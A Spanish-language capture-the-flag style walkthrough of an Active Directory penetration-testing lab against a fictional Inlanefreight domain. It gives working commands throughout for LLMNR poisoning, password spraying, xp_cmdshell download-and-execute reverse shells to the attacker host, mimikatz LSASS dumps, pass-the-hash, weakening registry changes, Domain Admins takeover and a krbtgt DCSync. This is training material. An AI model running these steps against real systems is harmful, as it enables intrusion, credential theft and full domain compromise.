# AD Enumeration & Attacks - Skills Assessment Part II

## Scenario

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.

## Solución

### Consideraciones de pivoting sobre la máquina parrot
Nuestra máquina $target `10.129.34.149`, tiene otra interfaz: `172.16.7.240`
- para poder compartir archivos hay que habilitar reverse port forwarding
    - El archivo de configuración `/etc/ssh/sshd_config` debe tener el valor;
        ```textplain
        GatewayPorts yes
        ```

    - A continuación hay que reiniciar el servicio
        ```bash
        sudo systemctl restart ssh
        ```



- Para compartir archivos
    - Redirigir el tráfico por el puerto 8888 de $target al 8000 de nuestra pwnbox
        ```bash
        ssh -R 8888:localhost:8000 htb-student@$target -vN
        ```
    - Compartir archivos en pwnbox
        ```bash
        python3 -m http.server
        ```
    - Descargar archivos (`certutil`) desde la máquina que no tiene acceso directo a nuestra pwnbox 
        ```powershell
        certutil -urlcache -split -f http://172.16.7.240:8888/mimikatz.exe C:\Users\public\mimikatz.exe
        ```
    - Descargar archivos (fileless, `DownloadString`)
        ```powershell
        powershell IEX (New-Object Net.WebClient).DownloadString('http://172.16.7.240:8888/Invoke-PowerShellTcp.ps1')
        ```
- Para revshell 
    - En nuestra pwnbox
        ```bash
        ssh -R 44444:localhost:4444 htb-student@$target -vN
        ```
    - En la máquina que no tiene acceso a nuestra pwnbox: 
        ```bash
        revshell con ip 172.16.7.240 y puerto 44444
        ```


- Para acceder a ciertos servicios (p. ej: mssql). En este caso no tendríamos acceso a 172.16.7.60 desde la máquina atacante
    - pwnbox: Configuración pivoting
        ```bash
        ssh -NfL 11433:172.16.7.60:1433 htb-student@$target
        ```
    - pwnbox: Conexión vía mssql
        ```bash
        impacket-mssqlclient INLANEFREIGHT/netdb@localhost -port 11433
        ```
- Para acceder a `impacket-pssexec`
    - pwnbox: configuración pivoting (hay que conectarse forzosamente al puerto 445)
        ```bash
        ssh -NfL 445:172.16.7.50:445 htb-student@$target        ```
    - pwnbox: conexión vía impacket
        ```bash
        impacket-psexec mssqlsvc@localhost -hashes :8c9555327d95f815987c0d81238c7660 -port 4445
        ```

### Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?


- Comprobamos que nuestra dirección de red es `172.16.7.240/23`
- Ejecutamos un ping masivo para descubrir hosts vivos
    ```bash
    fping -asgq 172.16.7.240/23
    ```
- Con los hosts descubiertos, ejecutamos `nmap`
    ```bash
    sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum -oN allTargets
    ```
    descubriendo: 
    - dominio: `INLANEFREIGHT.LOCAL`
    - DC: `172.16.7.3`
    - MS01: `172.16.7.50`
    - SQL01: `172.16.7.60`

- Configuramos `/etc/resolv.conf` del siguiente modo: 
    ```bash
    cat /etc/resolv.conf
    <SNIP>
    #nameserver 1.1.1.1
    #nameserver 8.8.8.8

    domain INLANEFREIGHT.LOCAL                       
    nameserver 172.16.7.3
    ```

- Hacemos LLMNR/NBT-NS Possoning con `responder`
    ```bash
    sudo responder -I ens224
    ```

- Obtenemos hashes en `/usr/share/responder/logs`, viendo que aparece el usuario `AB920` en repetidas ocasiones. Tratamos de craquear el hash de este usuario:
    ```bash
    tail -1 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt > hashAB920
    hashcat -m 5600 hashAB920 /usr/share/wordlists/rockyou.txt
    ```

- Conseguimos craquearlo teniendo las primeras credenciales de accesso al dominio: 
    - `AB920:weasal`

- Nos conectamos con MS01 vía `evilwin-rm` (no funciona algún protocolo como rdp) pivotando en la máquina a la que tenemos acceso
    - Pivotamos sobre la máquina que nos dan acceso (`$target` es ahora MS01 y `$pivot` la máquina parrot que nos dan acceso)
        ```bash
        # http (default) - podría hacer falta 5986 para https
        ssh -NfL 5985:$target:5985 htb-student@$pivot
        ```
    - Nos conectamos vía winRM del siguiente modo: 
        ```bash
        evil-winrm -i 127.0.0.1 -u AB920 -p weasal
        # ó 
        evil-winrm -i 127.0.0.1 -u AB920@INLANEFREIGHT.LOCAL -p weasal
        # no funciona ninguna de los intentos comentados a continuación:
        #evil-winrm -i 127.0.0.1 -u INLANEFREIGHT.LOCAL\AB920 -p weasal
        #evil-winrm -i 127.0.0.1 -u INLANEFREIGHT\AB920 -p weasal
        ```

    - Obteniendo la primera flag

###  Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
- Nos pasamos la herramienta `powerview` a `MS01`:
    ```powershell
    *Evil-WinRM* PS C:\Users\AB920\Documents\utils> upload /home/an0nio/htb/academy/AD/lab2/share/powerview.ps1 C:\Users\AB920\Documents\utils
    ```
- Ponemos las credenciales del usuario para poder ejecutar algunos comandos que interactúen con otros servicios del sistema: 
    ```powershell
    $SecPassword = ConvertTo-SecureString 'weasal' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\AB90', $SecPassword)
    ```
- Al ser un usuairio con pocos privilegios, no podemos ejecutar dumpeo de LSASS, SAM, ni obtener usuarios susceptibles de aspreproasting. Tampoco parece que arroje ninguna infromación hacer ataques kerberoasting. 

- Intentamos hacer password spraying. Lo hacemos con `kerbroute` en la máquina Windows: 
    - Descargamos el binario amd64 desde la [página oficial de github](https://github.com/ropnop/kerbrute/releases)
    - Pasamos la lista `jsmith` a la carpeta de trabajo
    - Hacemos enumeración de usuarios
        ```powershell
        .\kerbrute_windows_amd64.exe userenum -d inlanefreight.local --dc dc01 jsmith.txt
        ```
        Encontrando 57 usuarios válidos, pero no podemos hacer password spraying sobre ninguno de estos

    - Nos vamos a la pwnbox y ejecutamos
        ```bash
        crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users 
        # Funciona también con rpcclient - enumdomusers y con enum4linux
        ```
    - Volcamos la información de los usuarios en un arhcivo llamado `users_raw`, y creamos una lista válida escribiendo lo siguiente sobre el archivo
        ```bash
        #Ejemplo de línea del archivo raw users: 
        #SMB         172.16.7.3      445    DC01             INLANEFREIGHT.LOCAL\Administrator                  badpwdcount: 0 baddpwdtime: 2022-04-11 23:12:32.366484

        cat raw_users | awk '{print $5}' | awk -F '\' '{print $2}' > valid_users
        # otra opción
        awk '{print $5}' raw_users | cut -d'\' -f2  > valid_users
        ```

    - Ejecutamos password spraying con `Welcome1` y `kerbrute`, ejecutando lo siguiente: 
        ```bash
        kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users Welcome1
        ```
        Encontrando que `Welcome1` es válida para `BR086`. Credenciales: `BR086:Welcome1`

###  Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
- Con estas credenciales podemos acceder al contenido `Deparment Shares` (No he podido vía `smblcient`) de `DC01`
    ```textplain
    crackmapexec smb 172.16.7.3 -u "BR086" -p "Welcome1" --shares                                                                                                                                                                
    SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)                                                                         
    SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1                                                                                                                                         
    SMB         172.16.7.3      445    DC01             [+] Enumerated shares                                                                                                                                                          
    SMB         172.16.7.3      445    DC01             Share           Permissions     Remark                                                                                                                                         
    SMB         172.16.7.3      445    DC01             -----           -----------     ------                                                                                                                                         
    SMB         172.16.7.3      445    DC01             ADMIN$                          Remote Admin                                                                                                                                   
    SMB         172.16.7.3      445    DC01             C$                              Default share                                                                                                                                  
    SMB         172.16.7.3      445    DC01             Department Shares READ            Share for department users                                                                                                                   
    SMB         172.16.7.3      445    DC01             IPC$            READ            Remote IPC                                                                                                                                     
    SMB         172.16.7.3      445    DC01             NETLOGON        READ            Logon server share                                                                                                                             
    SMB         172.16.7.3      445    DC01             SYSVOL          READ            Logon server share    
    ```

- Mapeamos el contenido con powershell
    ```powershell
    $pass = ConvertTo-SecureString 'Welcome1' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\BR086',$pass )
    New-PSDrive -Name "N" -Root "\\172.16.7.3\Department Shares" -PSProvider "FileSystem" -Credential $cred
    ```
- Encontramos un archivo `web.config` que contiene la siguiente línea: 
    ```powershell
     type web.config | select-string pass
    <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
    ```
    Por lo que obtenemos las siguientes credenciales: `netdb:D@ta_bAse_adm1n!`

- Accedemos al servicio MSSQL de `SQL01` con estas credenciales
    ```bash
    mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60 
    ```


- Tras comprobar que la IP de nuestra máquina atacante es 172.16.7.240, ejecutamos un onliner que descarga `Invoke-PowershellTcp.ps1` de nishang y lo ejecuta directamente de forma fileless.
    - Compartimos el archivo con `python -m http.server`
    - Nos ponemos en escucha: `nc -nlvp 4444`
    - Descargamos y ejecutamos el archivo
		```mssql
	        xp_cmdshell "powershell -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString(''http://172.16.7.240:8000/Invoke-PowerShellTcp.ps1''); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.7.240 -Port 4444"
        # valía igualmente xp_cmdshell "powershell IEX ...
		```
    - Opción alternativa a la anterior. 
        - Añadir al final del archivo `Invoke-PowerShellTcp.ps1` la línea
            ```powershell
            Invoke-PowerShellTcp -Reverse -IPAddress 172.16.7.240 -Port 4444
            ```
        - Descargamos el archivo con certutil
            ```powershell
            xp_cmdshell "certutil -urlcache -split -f http://172.16.7.240:8000/Invoke-PowerShellTcp.ps1 C:\Windows\Temp\Invoke-PowerShellTcp.ps1"
            ```
        - Y lo ejecutamos
            ```powershell
            xp_cmdshell "powershell IEX c:\Windows\Temp\Invoke-PowerShellTcp.ps1"
            ```
            

- Una vez tenemos conexión, tratamos de escalar privilegios. Comprobamos con 
    ```powershell
    whoami /priv
    ```
    Que tenemos 
    ```
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled
    ```
    Lo cual nos permite abusar 
- Nos pasamos el archivo `PrintSpoofer64.exe`, por ejemplo con certutil
    ```powershell
    certutil -urlcache -split -f http://172.16.7.240:8000/PrintSpoofer64.exe C:\Users\public\printspoofer.exe
    ```
- Elevamos privilegios con una powershell #3 (Base64) de revshells: 
    - Nos ponemos en escucha
        ```bash
        nc -nlvp 1234
        ```
    - Ejecutamos una revshell con `printspoofer`
        ```poweshell
        .\printspoofer.exe -c "powershell -e JABjAGwA..." 
        ```
        Era más fácil elevar: 
		```powershell
		.\PrintSpoofer64.exe -i -c powershell
		```

###  Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.

- Una vez conectados con privilegios de adminsitrador, tratamos de volcar información relevante con mimikatz:
    - Descargamos mimikatz con `certutil`
        ```powershell
        certutil -urlcache -split -f http://172.16.7.240:8000/mimikatz.exe C:\Users\public\mimikatz.exe
        ```
    - Hacemos un volcado de lsass: 
        ```powershell
        .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit" > sekurlsa_logon
        ```
    - Encontramos un hash para `mssqlsvc`: `8c9555327d95f815987c0d81238c7660` que nos sirve para hacer un pth en ms01:
        ```powershell
        impacket-psexec mssqlsvc@172.16.7.50 -hashes :8c9555327d95f815987c0d81238c7660
        ```
        
### Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
Lo obtenemos con `bloodhound`

###  Crack this user's password hash and submit the cleartext password as your answer.
- Hacemos nuevamente un volcado de lsass, sin demasiada información valiosas
- Nos ayudamos de una pista en la que nos dice que hagamos algo similar al principio de obtener las credenciales, por lo que ejecutamos `inveight.ps1`, que es similar a `responder`, pero para windows. Descargamos el archivo
    ```powershell
    certutil -urlcache -split -f http://172.16.7.240:8888/Inveigh.exe C:\Users\public\Inveigh.exe
    ```
- Y lo ejecutamos
    ```powershell
    Inveigh.exe
    ```
- Tras unos segundos obtenemos el hash y lo crackeamos offline obteniendo como contraseña: `charlie1`. Tenemos por lo tanto las siguientes credenciales: 
    ```textplain
    CT056:charlie1
    ```
### Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.

- Tratamos de conectamos con las credenciales obtenidas víaRDP. Para ello, en la máquina `MS01`, con las credenciales de `mssqlsvc`,  activamos restricted admin mode para poder acceder por RDP como el usuario `CT059` del siguiente modo: 
    ```powershell
    reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
    ```
- A continuación nos conectamos vía RDP. 
    - Hacemos un local port forwarding desde la máquina que tenemos acceso: 
        ```bash
        ssh -NfL 33389:172.16.7.50:3389 htb-student@$target
        ```
    - Nos conectamos vía RDP
        ```bash
        xfreerdp /v:localhost /u:'inlanefreight\CT059' /p:'charlie1' /drive:Shared,/tmp /port:33389
        ```
- Dado que el usuario tiene permisos `GenericAll`, podemos hacer prácticamente lo que queramos. Añadimos al usuario `CT059` a domain admins
    ```powershell
    net group "Domain Admins" CT059 /add /domain
    ```
- Esto nos permite mostrar el contenido del DC
    ```powershell
    type '\\172.16.7.3\C$\Users\Administrator\Desktop\flag.txt'
    ```
- Si ahora tratamos de ejecutar mimikatz o powershell con privilegios elevados aún no podemos, por lo que debemos evitar restricciones cambiando el valor de `LocalAccountTokenFilterPolicy`
    ```powershell
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
    ```
- Ahora ya podemos ejecutar mimikatz con privilegios altos y volcar el hash NTML de `krbtgt`
    ```powershell
    privilege::debug
    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
    ```
- También hubiéramos podido volcar esta información con `impacket-secretsdump`
    ```bash
    impacket-secretsdump -just-dc-user krbtgt inlanefreight/CT059:charlie1@172.16.7.3
    ```


